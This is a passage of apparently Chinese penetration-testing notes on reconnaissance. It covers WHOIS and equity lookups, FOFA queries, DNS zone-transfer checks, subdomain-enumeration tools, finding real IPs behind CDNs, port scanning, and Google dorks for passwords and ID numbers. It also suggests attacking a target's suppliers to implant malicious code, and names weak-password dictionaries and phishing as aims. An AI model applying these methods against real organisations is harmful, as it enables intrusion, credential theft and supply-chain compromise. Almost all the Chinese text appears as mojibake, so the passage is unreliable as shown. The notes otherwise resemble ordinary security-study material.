‡çš„WHOISä¿¡æ¯ï¼Œå¯ä»¥å¯¹è”ç³»äººã€è”ç³»é‚®ç®±ç­‰ä¿¡æ¯è¿›è¡ŒåæŸ¥ï¼Œå¯ä»¥è·å–æ›´å¤šç›¸å…³çš„åŸŸåä¿¡æ¯ã€‚</p></li><li><p>åœ¨çº¿æŸ¥è¯¢</p><p><a href="https://whois.chinaz.com/">åŸŸåWhoisæŸ¥è¯¢ - ç«™é•¿ä¹‹å®¶</a></p><p><a href="http://whois.bugscaner.com/">åœ¨çº¿åŸŸåWhoisæŸ¥è¯¢,ç½‘ç«™WhoisåæŸ¥-åœ¨çº¿ç«™é•¿å·¥å…· bugscaner</a></p><p><a href="https://who.is/">WHOIS Search, Domain Name, Website, and IP Tools - Who.is</a></p></li></ul><h3 id="è‚¡æƒä¿¡æ¯"><a href="#è‚¡æƒä¿¡æ¯" class="headerlink" title="è‚¡æƒä¿¡æ¯"></a>è‚¡æƒä¿¡æ¯</h3><ul><li><p>æ˜¯ä»€ä¹ˆï¼Œæœ‰ä»€ä¹ˆç”¨</p><p>é€šè¿‡æŸ¥è¯¢è‚¡æƒä¿¡æ¯ï¼Œæˆ–è€…è‚¡æƒç©¿é€å›¾ï¼Œå¯»æ‰¾å­å…¬å¸å’Œå­™å…¬å¸ç­‰ï¼Œä¸€èˆ¬å¯¹å¤–æŠ•èµ„è¶…è¿‡50%æˆ–è€…æœ‰è¡Œæ”¿æƒé™çš„éƒ½å¯ä»¥ç®—ç›®æ ‡</p></li><li><p>æŸ¥è¯¢ç½‘ç«™</p><p><a href="https://www.qcc.com/">ä¼æŸ¥æŸ¥ </a></p><p><a href="https://www.tianyancha.com/">å¤©çœ¼æŸ¥</a></p></li></ul><h3 id="å…¶ä»–åº”ç”¨ä¸­çš„åŸŸå-x2F-IP"><a href="#å…¶ä»–åº”ç”¨ä¸­çš„åŸŸå-x2F-IP" class="headerlink" title="å…¶ä»–åº”ç”¨ä¸­çš„åŸŸå&#x2F;IP"></a>å…¶ä»–åº”ç”¨ä¸­çš„åŸŸå&#x2F;IP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¾®ä¿¡/æ”¯ä»˜å®å°ç¨‹åº</span><br><span class="line">å¾®ä¿¡å…¬ä¼—å·</span><br><span class="line">æ‰‹æœºAPPï¼šæŠ“åŒ…ï¼Œå†å²ç‰ˆæœ¬</span><br></pre></td></tr></table></figure><h3 id="DNSå…±äº«è®°å½•æŸ¥è¯¢"><a href="#DNSå…±äº«è®°å½•æŸ¥è¯¢" class="headerlink" title="DNSå…±äº«è®°å½•æŸ¥è¯¢"></a>DNSå…±äº«è®°å½•æŸ¥è¯¢</h3><ul><li><p>åŸç†</p><p>æŸ¥è¯¢å…±äº«DNSæœåŠ¡å™¨çš„ä¸»æœºæ¥è·å–åˆ°ç›¸å…³çš„åŸŸå</p></li><li><p>æ­¥éª¤</p><ol><li><p>é¦–å…ˆæŸ¥è¯¢ç›®æ ‡æ˜¯å¦å­˜åœ¨è‡ªå»ºçš„NSæœåŠ¡å™¨</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nslookup -query=ns baidu.com</span><br></pre></td></tr></table></figure></li><li><p>å°†éæƒå¨åº”ç­”ä¸­çš„nsæœåŠ¡å™¨å¸¦åˆ°ä¸‹é¢çš„ç½‘ç«™æŸ¥è¯¢</p><p><a href="https://hackertarget.com/find-shared-dns-servers/">Find all Hosts pointing to DNS Server</a></p></li></ol></li></ul><h3 id="ç½‘ç»œç©ºé—´æµ‹ç»˜"><a href="#ç½‘ç»œç©ºé—´æµ‹ç»˜" class="headerlink" title="ç½‘ç»œç©ºé—´æµ‹ç»˜"></a>ç½‘ç»œç©ºé—´æµ‹ç»˜</h3><p>å¤šç”¨å‡ ä¸ªç½‘ç»œç©ºé—´æœç´¢å¼•æ“</p><p>FoFaè¯­æ³•</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">title=&quot;&quot;  # æ ‡é¢˜   </span><br><span class="line">title=&quot;Directory listing for /&quot; # ç›®å½•éå†</span><br><span class="line">tile=&quot;outlook&quot; / &quot;tomcat&quot; / &quot;weblogic&quot;  # æŸ¥æ‰¾ç‰¹å®šåº”ç”¨</span><br><span class="line">server=&quot;WebSockify Python&quot; &amp;&amp; title=&quot;Directory listing for /&quot;  # æŸ¥æ‰¾novncï¼ˆnovncè¿è¡Œåœ¨å®¹å™¨é‡Œï¼‰</span><br><span class="line"></span><br><span class="line">header=xxx # è¯·æ±‚å¤´  æ„Ÿè§‰hunterçš„å¤š</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cert=è‹±æ–‡ç¼©å†™   # è¯ä¹¦å†…å®¹</span><br><span class="line">cert.subject=è‹±æ–‡ç¼©å†™ # è¯ä¹¦æŒæœ‰è€…</span><br><span class="line">cert.issuer=è‹±æ–‡ç¼©å†™ # è¯ä¹¦é¢å‘è€…</span><br><span class="line"></span><br><span class="line">body=xxx  # é¡µé¢å†…å®¹</span><br><span class="line"></span><br><span class="line">is_honeypot=false æ’é™¤èœœç½æ•°æ®ï¼Œä»…é™FOFAé«˜çº§ä¼šå‘˜ä½¿ç”¨</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æ¨¡ç³Šæœç´¢ ä»…é™ä¸ªäººç‰ˆåŠä»¥ä¸Šæˆ–æ¶ˆè€—Fç‚¹ä½¿ç”¨</span></span><br><span class="line">= â†’ *= è¡¨ç¤ºä½¿ç”¨æ¨¡ç³Šæœç´¢åŠŸèƒ½</span><br><span class="line">* è¡¨ç¤ºåŒ¹é…çš„æ•°é‡ä¸å—é™åˆ¶ï¼Œå¯ä»¥ç”¨æ¥ä»£æ›¿ 0 ä¸ªã€1 ä¸ªæˆ–å¤šä¸ªå­—ç¬¦</span><br><span class="line">? ä»…ä»…å¯æ›¿ä»£ 1 ä¸ªå­—ç¬¦</span><br><span class="line"></span><br><span class="line">https://github.com/FofaInfo/Awesome-FOFA/blob/main/Basic%20scenario/Basic%20scenario_ZH/FOFA%E6%A8%A1%E7%B3%8A%E6%90%9C%E7%B4%A2%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF.md</span><br></pre></td></tr></table></figure><h3 id="ä¾›åº”é“¾å…¬å¸"><a href="#ä¾›åº”é“¾å…¬å¸" class="headerlink" title="ä¾›åº”é“¾å…¬å¸"></a>ä¾›åº”é“¾å…¬å¸</h3><p><a href="https://xz.aliyun.com/t/10531">è®°ä¸€æ¬¡é€šè¿‡ä¾›åº”é“¾æ‹¿åˆ°ç›®æ ‡åå°æƒé™çš„è¿‡ç¨‹ - å…ˆçŸ¥ç¤¾åŒº</a></p><p><a href="https://mp.weixin.qq.com/s/IgmxbD-1y08w5gd7gVOmSg">https://mp.weixin.qq.com/s/IgmxbD-1y08w5gd7gVOmSg</a></p><ul><li><p>ä¸ºä»€ä¹ˆ</p><p>è¯•æƒ³ä¸€ä¸‹ï¼Œç›®æ ‡ä½¿ç”¨ä¾›åº”å•†æä¾›çš„è½¯ä»¶ï¼Œé‚£ä¹ˆè¿™äº›è½¯ä»¶æ˜¯å—åˆ°ä¿¡ä»»çš„ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡æ”»å‡»ä¾›åº”å•†ï¼Œå¹¶åœ¨è½¯ä»¶ä¸­æ¤å…¥æ¶æ„ä»£ç ï¼Œè¿™æ ·ç›®æ ‡åœ¨è¿è¡Œè½¯ä»¶æ—¶ä¹Ÿä¼šè¿è¡Œæ¶æ„ä»£ç ï¼Œä»è€Œè¾¾åˆ°æ”»å‡»ã€‚</p><p>å¹¶ä¸”ä¾›åº”å•†ä¿å­˜äº†ç›®æ ‡çš„å„ç§ä¿¡æ¯ã€‚</p></li><li><p>æ‰‹æ®µ</p><ul><li>ç½‘ç«™é¡µåº•çš„å¤‡æ¡ˆï¼Œç‰ˆæƒä¿¡æ¯<img src="/../images/image-20230511130314346-1685533751887.png" alt="image-20230511130314346"></li><li>æ‹›æ ‡æ–‡ä»¶</li></ul></li></ul><h3 id="èšåˆå·¥å…·"><a href="#èšåˆå·¥å…·" class="headerlink" title="èšåˆå·¥å…·"></a>èšåˆå·¥å…·</h3><p><a href="https://github.com/wgpsec/ENScan_GO">https://github.com/wgpsec/ENScan_GO</a></p><blockquote><p>ä¸€æ¬¾åŸºäºå„å¤§ä¼ä¸šä¿¡æ¯APIçš„å·¥å…·ï¼Œè§£å†³åœ¨é‡åˆ°çš„å„ç§é’ˆå¯¹å›½å†…ä¼ä¸šä¿¡æ¯æ”¶é›†éš¾é¢˜ã€‚ä¸€é”®æ”¶é›†æ§è‚¡å…¬å¸ICPå¤‡æ¡ˆã€APPã€å°ç¨‹åºã€å¾®ä¿¡å…¬ä¼—å·ç­‰ä¿¡æ¯èšåˆå¯¼å‡ºã€‚</p></blockquote><p><img src="/../images/ENScanGo-1685533751887.png" alt="ENScanGo"></p><h2 id="å­åŸŸåæ”¶é›†"><a href="#å­åŸŸåæ”¶é›†" class="headerlink" title="å­åŸŸåæ”¶é›†"></a>å­åŸŸåæ”¶é›†</h2><h3 id="æšä¸¾çˆ†ç ´"><a href="#æšä¸¾çˆ†ç ´" class="headerlink" title="æšä¸¾çˆ†ç ´"></a>æšä¸¾çˆ†ç ´</h3><ul><li><p>åŸç†</p><p>é€šè¿‡ä¸æ–­çš„æ‹¼æ¥å­—å…¸ä¸­çš„å­åŸŸåå‰ç¼€å»æšä¸¾åŸŸåçš„Aè®°å½•ï¼Œå†å¯¹å…¶è¿›è¡ŒéªŒè¯ï¼Œä½†æ˜¯è¯¥æ–¹æ³•ä¸€èˆ¬éœ€è¦è§£å†³æ³›è§£æé—®é¢˜ã€‚</p></li><li><p>åœ¨çº¿ç½‘ç«™</p><p><a href="http://z.zcjun.com/">åœ¨çº¿å­åŸŸåçˆ†ç ´-å­æˆå›æä¾›</a></p></li></ul><h3 id="è¯ä¹¦é€æ˜åº¦"><a href="#è¯ä¹¦é€æ˜åº¦" class="headerlink" title="è¯ä¹¦é€æ˜åº¦"></a>è¯ä¹¦é€æ˜åº¦</h3><ul><li><p>æ˜¯ä»€ä¹ˆ</p><p>è¯ä¹¦é€æ˜æ€§ï¼ˆCertificate Transparencyï¼ŒCTï¼‰æ˜¯ Google çš„å…¬å¼€é¡¹ç›®ï¼Œé€šè¿‡è®©åŸŸæ‰€æœ‰è€…ã€CA å’ŒåŸŸç”¨æˆ·å¯¹ SSL è¯ä¹¦çš„å‘è¡Œå’Œå­˜åœ¨è¿›è¡Œå®¡æŸ¥ï¼Œæ¥çº æ­£è¿™äº›åŸºäºè¯ä¹¦çš„å¨èƒã€‚</p></li><li><p>æœ‰ä»€ä¹ˆç”¨</p><p>å› ä¸ºæ˜¯å…¬å¼€çš„ï¼Œæ‰€ä»¥ä»»ä½•äººéƒ½å¯ä»¥è®¿é—®åˆ°å…¶ä¸­çš„CA è¯ä¹¦ï¼ŒåŒ…å«äº†åŸŸåã€å­åŸŸåã€é‚®ç®±ç­‰æ•æ„Ÿä¿¡æ¯ã€‚</p></li><li><p>åœ¨çº¿æŸ¥è¯¢</p><p><a href="https://crt.sh/">crt.sh | Certificate Search</a></p><p><a href="https://search.censys.io/">Censys Search</a></p></li></ul><h3 id="DNSå…¬å¼€æ•°æ®é›†"><a href="#DNSå…¬å¼€æ•°æ®é›†" class="headerlink" title="DNSå…¬å¼€æ•°æ®é›†"></a>DNSå…¬å¼€æ•°æ®é›†</h3><p>åˆ©ç”¨å·²æœ‰å…¬å¼€çš„æ‰«ææ•°æ®é›†ï¼Œå¯¹å­åŸŸåä¿¡æ¯è¿›è¡Œæ”¶é›†ã€‚</p><p><a href="https://opendata.rapid7.com/">https://opendata.rapid7.com/</a></p><h3 id="DNS-åŸŸä¼ é€"><a href="#DNS-åŸŸä¼ é€" class="headerlink" title="DNS åŸŸä¼ é€"></a>DNS åŸŸä¼ é€</h3><ul><li><p>æ˜¯ä»€ä¹ˆ</p><p>DNSæœåŠ¡å™¨åˆ†ä¸ºä¸»æœåŠ¡å™¨ï¼Œå¤‡ä»½æœåŠ¡å™¨ï¼Œç¼“å­˜æœåŠ¡å™¨ã€‚</p><p><strong>åŸŸä¼ é€</strong>æ˜¯æŒ‡å¤‡ä»½æœåŠ¡å™¨ä»ä¸»æœåŠ¡å™¨ä¸Šå¤åˆ¶æ•°æ®ï¼Œç„¶åæ›´æ–°è‡ªèº«çš„æ•°æ®åº“ï¼Œä»¥è¾¾åˆ°æ•°æ®åŒæ­¥çš„ç›®çš„ï¼Œè¿™æ ·æ˜¯ä¸ºäº†å¢åŠ å†—ä½™ï¼Œä¸€æ—¦ä¸»æœåŠ¡å™¨å‡ºç°é—®é¢˜å¯ç›´æ¥è®©å¤‡ä»½æœåŠ¡å™¨åšå¥½æ”¯æ’‘å·¥ä½œã€‚</p></li><li><p>æœ‰ä»€ä¹ˆç”¨</p><p>è‹¥ DNS æœåŠ¡å™¨é…ç½®ä¸å½“ï¼Œå¯èƒ½å¯¼è‡´æ”»å‡»è€…è·å–æŸä¸ªåŸŸçš„æ‰€æœ‰è®°å½•ã€‚é€ æˆæ•´ä¸ªç½‘ç»œçš„æ‹“æ‰‘ç»“æ„æ³„éœ²ç»™æ½œåœ¨çš„æ”»å‡»è€…ã€‚</p></li><li><p>æ£€æµ‹æ–¹æ³•</p><ul><li><p>digè¯·æ±‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æ‰¾åˆ°NSæœåŠ¡å™¨</span></span><br><span class="line">dig [domain] ns</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å‘é€axfrè¯·æ±‚</span></span><br><span class="line">dig axfr @[ns] [domain]</span><br></pre></td></tr></table></figure></li><li><p>nmapè„šæœ¬</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--script dns-zone-transfer --script-args dns-zone-transfer.domain=[domain]</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="æœç´¢å¼•æ“"><a href="#æœç´¢å¼•æ“" class="headerlink" title="æœç´¢å¼•æ“"></a>æœç´¢å¼•æ“</h3><ul><li><p>ä¼ ç»Ÿæœç´¢å¼•æ“</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site: xxx.com -xxx (-xxx æ’é™¤å“ªäº›å­åŸŸ)</span><br></pre></td></tr></table></figure></li><li><p>ç½‘ç»œç©ºé—´æµ‹ç»˜</p><p><a href="https://fofa.info/">fofa</a></p><p><a href="https://hunter.qianxin.com/">é¹°å›¾å¹³å°</a></p></li></ul><h3 id="ç¬¬ä¸‰æ–¹åœ¨çº¿å¹³å°"><a href="#ç¬¬ä¸‰æ–¹åœ¨çº¿å¹³å°" class="headerlink" title="ç¬¬ä¸‰æ–¹åœ¨çº¿å¹³å°"></a>ç¬¬ä¸‰æ–¹åœ¨çº¿å¹³å°</h3><ul><li><p><a href="https://securitytrails.com(uiå¥½çœ‹,ç»“æœæœ€å¤š)/">https://securitytrails.comï¼ˆUIå¥½çœ‹ï¼Œç»“æœæœ€å¤šï¼‰</a></p></li><li><p><a href="https://dnsdumpster.com/">DNSdumpster.com </a></p></li><li><p><a href="https://rapiddns.io/">https://rapiddns.io/</a></p></li></ul><h3 id="èšåˆå·¥å…·-1"><a href="#èšåˆå·¥å…·-1" class="headerlink" title="èšåˆå·¥å…·"></a>èšåˆå·¥å…·</h3><h4 id="æ”¶é›†å·¥å…·"><a href="#æ”¶é›†å·¥å…·" class="headerlink" title="æ”¶é›†å·¥å…·"></a>æ”¶é›†å·¥å…·</h4><ul><li><p><code>OneForAll</code></p><blockquote><p>ä¸€æ¡é¾™ï¼Œéœ€è¦é…ç½®apiï¼Œé…åˆä»£ç†ä½¿ç”¨æ•ˆæœæ›´ä½³</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python oneforall.py --target domain run</span><br><span class="line">python oneforall.py --targets domain.txt run</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230508203149442-1685533751888.png" alt="image-20230508203149442"></p></li><li><p><code>Amass</code></p><p>æ„Ÿè§‰é€Ÿåº¦æ…¢</p><p>æ‰‹å†Œï¼š<a href="https://github.com/owasp-amass/amass/blob/master/doc/user_guide.md">https://github.com/owasp-amass/amass/blob/master/doc/user_guide.md</a></p><p>domainå¯è§†åŒ–</p><p><img src="/../images/maltego_results-1685533751888.png" alt="Maltego results"></p></li><li><p><code>ksubdomain</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ksubdomain -d seebug.org -full -summary</span><br></pre></td></tr></table></figure></li><li><p><code>subfinder</code> </p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">subfinder -silent -d hackerone.com </span><br></pre></td></tr></table></figure></li></ul><h4 id="æ¢æ´»å·¥å…·"><a href="#æ¢æ´»å·¥å…·" class="headerlink" title="æ¢æ´»å·¥å…·"></a>æ¢æ´»å·¥å…·</h4><ul><li><code>httpx</code></li></ul><p>è”åŠ¨</p><ul><li>subfinder é€šè¿‡å„ç§æœç´¢å¼•æ“è·å–åŸŸå</li><li>ksubdomain éªŒè¯åŸŸå</li><li>httpx httpè¯·æ±‚è·å¾—æ•°æ®,éªŒè¯å­˜æ´»</li></ul><p><img src="/../images/image-20230508205053563-1685533751888.png" alt="image-20230508205053563"></p><h2 id="IPæ®µä¿¡æ¯æ”¶é›†"><a href="#IPæ®µä¿¡æ¯æ”¶é›†" class="headerlink" title="IPæ®µä¿¡æ¯æ”¶é›†"></a>IPæ®µä¿¡æ¯æ”¶é›†</h2><h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><h4 id="åˆ¤æ–­CDN"><a href="#åˆ¤æ–­CDN" class="headerlink" title="åˆ¤æ–­CDN"></a>åˆ¤æ–­CDN</h4><h5 id="å¤šåœ°ping"><a href="#å¤šåœ°ping" class="headerlink" title="å¤šåœ°ping"></a>å¤šåœ°ping</h5><p>å¦‚æœæ²¡æœ‰ä½¿ç”¨CDNï¼Œåˆ™åªä¼šæ˜¾ç¤ºä¸€ä¸ªIPåœ°å€ã€‚</p><ul><li><a href="http://www.webkaka.com/Ping.aspx">http://www.webkaka.com/Ping.aspx</a>ï¼ˆå›½å†…+å›½å¤–ï¼‰</li><li><a href="https://www.host-tracker.com/v3/check/">https://www.host-tracker.com/v3/check/</a>  ï¼ˆå›½å¤–ï¼‰</li></ul><h5 id="nslookupæ³•"><a href="#nslookupæ³•" class="headerlink" title="nslookupæ³•"></a>nslookupæ³•</h5><ul><li><p>æœåŠ¡å™¨åç§°</p><p><img src="/../images/image-20230509225424444-1685533751888.png" alt="image-20230509225424444"></p></li><li><p>åŒä¸€ä¸ªåŸŸåè§£æå¯¹åº”å¤šä¸ª IP åœ°å€</p><p><img src="/../images/image-20230509225313449-1685533751888.png" alt="image-20230509225313449"></p></li></ul><h5 id="è§‚å¯Ÿheader"><a href="#è§‚å¯Ÿheader" class="headerlink" title="è§‚å¯Ÿheader"></a>è§‚å¯Ÿheader</h5><ul><li>è§‚å¯Ÿè¯·æ±‚å“åº”çš„è¿”å›æ•°æ®çš„å¤´éƒ¨ï¼Œæ˜¯å¦æœ‰ CDN æœåŠ¡å•†æ ‡è¯†</li><li>è‹¥ asp æˆ–è€… asp.net ç½‘ç«™è¿”å›å¤´çš„ server ä¸æ˜¯ IISã€è€Œæ˜¯ Nginxï¼Œåˆ™å¤šåŠä½¿ç”¨äº†nginxåå‘ä»£ç†åˆ° CDN<img src="/../images/image-20210901093608312-1685533751888.png" alt="image-20210901093608312"></li></ul><h5 id="åœ¨çº¿ç½‘ç«™"><a href="#åœ¨çº¿ç½‘ç«™" class="headerlink" title="åœ¨çº¿ç½‘ç«™"></a>åœ¨çº¿ç½‘ç«™</h5><p><a href="https://www.cdnplanet.com/tools/cdnfinder/">https://www.cdnplanet.com/tools/cdnfinder/</a></p><h4 id="ç»•è¿‡CDN"><a href="#ç»•è¿‡CDN" class="headerlink" title="ç»•è¿‡CDN"></a>ç»•è¿‡CDN</h4><p>[BYPASS-CDN&#x2F;CDN 2023 å®Œå…¨æ”»å‡»æŒ‡å—ï¼ˆä¸€ï¼‰.md at main Â· bin-maker&#x2F;BYPASS-CDN Â· GitHub](<a href="https://github.com/bin-maker/BYPASS-CDN/blob/main/CDN">https://github.com/bin-maker/BYPASS-CDN/blob/main/CDN</a> 2023 å®Œå…¨æ”»å‡»æŒ‡å—ï¼ˆä¸€ï¼‰.md)</p><h5 id="CDNè´¹ç”¨"><a href="#CDNè´¹ç”¨" class="headerlink" title="CDNè´¹ç”¨"></a>CDNè´¹ç”¨</h5><p>CDN åŠ é€Ÿéœ€è¦æ”¯ä»˜ä¸€å®šçš„è´¹ç”¨ï¼Œæ‰€ä»¥<strong>å­ç«™ï¼Œå›½å¤–</strong>å¾ˆå¯èƒ½æ²¡æœ‰éƒ¨ç½²CDNã€‚</p><h5 id="å†å²-DNS-è®°å½•"><a href="#å†å²-DNS-è®°å½•" class="headerlink" title="å†å² DNS è®°å½•"></a>å†å² DNS è®°å½•</h5><p><a href="https://viewdns.info/iphistory/?domain=www.baidu.com">IP History - ViewDNS.info</a></p><p><a href="https://x.threatbook.com/v5/domain/www.baidu.com?source=top">å¾®æ­¥åœ¨çº¿Xæƒ…æŠ¥ç¤¾åŒº-å¨èƒæƒ…æŠ¥æŸ¥è¯¢_å¨èƒåˆ†æå¹³å°_å¼€æ”¾ç¤¾åŒº</a></p><h5 id="é‚®ç®±"><a href="#é‚®ç®±" class="headerlink" title="é‚®ç®±"></a>é‚®ç®±</h5><blockquote><p>ç”¨ç›®æ ‡é‚®ä»¶æœåŠ¡å™¨å‘é€é‚®ä»¶ç»™è‡ªå·±(QQé‚®ç®±)å†æŸ¥çœ‹é‚®ä»¶æºç ä¸€å®šæƒ…å†µä¸‹å¯ä»¥æ‰¾åˆ°çœŸå®IPï¼ˆæœåŠ¡ç«¯å’Œæˆ‘ä»¬å»ºç«‹è¿æ¥ï¼‰</p><p>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ª<code>å¥‡æ·«æŠ€å·§</code>ï¼Œé€šè¿‡å‘é€é‚®ä»¶ç»™ä¸€ä¸ªä¸å­˜åœ¨çš„é‚®ç®±åœ°å€ï¼Œæ¯”å¦‚ <a href="mailto:000xxx@domain.com">000xxx@domain.com</a> ï¼Œå› ä¸ºè¯¥ç”¨æˆ·ä¸å­˜åœ¨ï¼Œæ‰€ä»¥å‘é€å°†å¤±è´¥ï¼Œå¹¶ä¸”è¿˜ä¼šæ”¶åˆ°ä¸€ä¸ªåŒ…å«å‘é€è¯¥ç”µå­é‚®ä»¶ç»™ä½ çš„æœåŠ¡å™¨çš„çœŸå® IP é€šçŸ¥ã€‚</p></blockquote><ul><li>RSS è®¢é˜…</li><li>é‚®ç®±æ³¨å†Œã€æ¿€æ´»å¤„</li><li>é‚®ç®±æ‰¾å›å¯†ç å¤„</li><li>äº§å“æ›´æ–°çš„é‚®ä»¶æ¨é€</li><li>æŸä¸šåŠ¡æ‰§è¡Œåå‘é€çš„é‚®ä»¶é€šçŸ¥</li><li>å‘˜å·¥é‚®ç®±ã€é‚®ä»¶ç®¡ç†å¹³å°ç­‰å…¥å£å¤„çš„å¿˜è®°å¯†ç </li></ul><h5 id="virtual-host-ç¢°æ’"><a href="#virtual-host-ç¢°æ’" class="headerlink" title="virtual-host ç¢°æ’"></a>virtual-host ç¢°æ’</h5><p>åŸç†ï¼š<a href="https://mp.weixin.qq.com/s/o8uAPbw7OSdFhHKOpOYKvg">https://mp.weixin.qq.com/s/o8uAPbw7OSdFhHKOpOYKvg</a></p><ul><li>å½“æˆ‘ä»¬æ”¶é›†äº†ç›®æ ‡è¶³å¤Ÿå¤šçš„å¯èƒ½çš„çœŸå® IP æ—¶ï¼Œå¯ä»¥é€šè¿‡ IP å’Œå­åŸŸçš„ç¢°æ’ï¼Œæ¥æ‰¹é‡è·å¾—å‘½ä¸­ç›®æ ‡ä»¥åŠç›®æ ‡å“ªäº›çš„å­åŸŸã€‚</li><li>åœ¨çº¿æ”¶é›†å·¥å…· <a href="https://pentest-tools.com/information-gathering/find-virtual-hosts">https://pentest-tools.com/information-gathering/find-virtual-hosts</a></li></ul><h5 id="ç©ºé—´æµ‹ç»˜å¼•æ“"><a href="#ç©ºé—´æµ‹ç»˜å¼•æ“" class="headerlink" title="ç©ºé—´æµ‹ç»˜å¼•æ“"></a>ç©ºé—´æµ‹ç»˜å¼•æ“</h5><ul><li><p>favicon.ico å“ˆå¸Œç‰¹å¾</p></li><li><p>ç½‘é¡µæºç ç‰¹å¾å€¼</p><blockquote><p>åœ¨æœåŠ¡å™¨æº IP åœ°å€å…è®¸è®¿é—®å¹¶ä¸”è¿”å›çš„ä¹Ÿæ˜¯ç±»ä¼¼çš„ç½‘ç«™å†…å®¹æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡ä¾¦å¯Ÿé¡µé¢æºç ä¸­ JS ã€CSS ã€HTML ç­‰ä¸€ç³»åˆ—é™æ€ç‰¹å¾å€¼ï¼Œç„¶åç”¨ Shodan ã€Zoomeye ã€Censys ç­‰æœç´¢å¼•æ“è¿›è¡ŒåŒ¹é…æœç´¢ï¼Œä»è€Œå®šä½ IP ã€‚</p></blockquote></li></ul><h4 id="çœŸå®-IP-ä½¿ç”¨"><a href="#çœŸå®-IP-ä½¿ç”¨" class="headerlink" title="çœŸå® IP ä½¿ç”¨"></a>çœŸå® IP ä½¿ç”¨</h4><p>åœ¨è·å–åˆ°çœŸå®IPåï¼Œé€šè¿‡ç›´æ¥è®¿é—®IPå¯èƒ½æ— æ³•è®¿é—®</p><ul><li><p>ä¿®æ”¹ hosts æ–‡ä»¶</p></li><li><p>burpsuite æµ‹è¯•</p><p><img src="/../images/image-20230510181257028-1685533751888.png" alt="image-20230510181257028"></p></li></ul><h3 id="Cæ®µåŠç«¯å£æ‰«æ"><a href="#Cæ®µåŠç«¯å£æ‰«æ" class="headerlink" title="Cæ®µåŠç«¯å£æ‰«æ"></a>Cæ®µåŠç«¯å£æ‰«æ</h3><h4 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap</span><br><span class="line">masscan</span><br><span class="line">fscan </span><br><span class="line">fscanç»“æœå¤„ç†ï¼š</span><br><span class="line">https://github.com/ZororoZ/fscanOutput</span><br><span class="line"></span><br><span class="line">TXPortMap</span><br></pre></td></tr></table></figure><h4 id="å¸¸è§ç«¯å£"><a href="#å¸¸è§ç«¯å£" class="headerlink" title="å¸¸è§ç«¯å£"></a>å¸¸è§ç«¯å£</h4><p><a href="http://zhuabapa.top/2020/06/03/%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/">â€˜å¸¸ç”¨ç«¯å£åˆ©ç”¨æ€»ç»“â€™ | zer0_c|imbâ€™s blog</a></p><h1 id="æ•æ„Ÿä¿¡æ¯æ”¶é›†"><a href="#æ•æ„Ÿä¿¡æ¯æ”¶é›†" class="headerlink" title="æ•æ„Ÿä¿¡æ¯æ”¶é›†"></a>æ•æ„Ÿä¿¡æ¯æ”¶é›†</h1><h2 id="ä¸ºä»€ä¹ˆ-1"><a href="#ä¸ºä»€ä¹ˆ-1" class="headerlink" title="ä¸ºä»€ä¹ˆ"></a>ä¸ºä»€ä¹ˆ</h2><ul><li><p>è¿æ°”å¥½ï¼Œä¸€æ­¥åˆ°ä½</p></li><li><p>åˆ¶ä½œæœ‰é’ˆå¯¹æ€§çš„å¼±å£ä»¤å­—å…¸</p></li><li><p>ğŸ£</p></li></ul><h2 id="æœç´¢å¼•æ“-1"><a href="#æœç´¢å¼•æ“-1" class="headerlink" title="æœç´¢å¼•æ“"></a>æœç´¢å¼•æ“</h2><ul><li><p>é’ˆå¯¹ä¿¡æ¯æ³„éœ²çš„åœ¨çº¿ç½‘ç«™</p><ul><li><p><a href="https://leakix.net/">LeakIX</a></p></li><li><p><a href="https://intelx.io/">https://intelx.io/</a></p></li><li><p><a href="https://haveibeenpwned.com/">https://haveibeenpwned.com/</a></p></li><li><p><a href="https://aleph.occrp.org/">https://aleph.occrp.org/</a></p></li><li><p><a href="https://dehashed.com/">https://dehashed.com/</a></p></li></ul></li><li><p><code>Google Hacking</code></p><ul><li><p>å¸¸ç”¨è¯­æ³•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:target.com  è´¦å· | å¯†ç  | å·¥å· | å­¦å· | èº«ä»½è¯ | å…¬ç¤º | é‚®ç®±</span><br></pre></td></tr></table></figure></li><li><p>å·¥å…·</p><p><a href="https://github.com/dwisiswant0/go-dork">https://github.com/dwisiswant0/go-dork</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.\go-dork.exe -q &quot;[è¯­æ³•]&quot; -p [é¡µé¢æ•°é‡] -x http://127.0.0.1:33210 </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ä¸€é¡µ10ä¸ªæ•°æ®</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-e æŒ‡å®šå¼•æ“ æµ‹è¯•äº†åªæœ‰googleå¯ä»¥</span><br><span class="line">Google, Shodan, Bing, Duck, Yahoo, Ask</span><br></pre></td></tr></table></figure><p>â€‹<img src="/../images/image-20230510222146978-1685533751888.png" 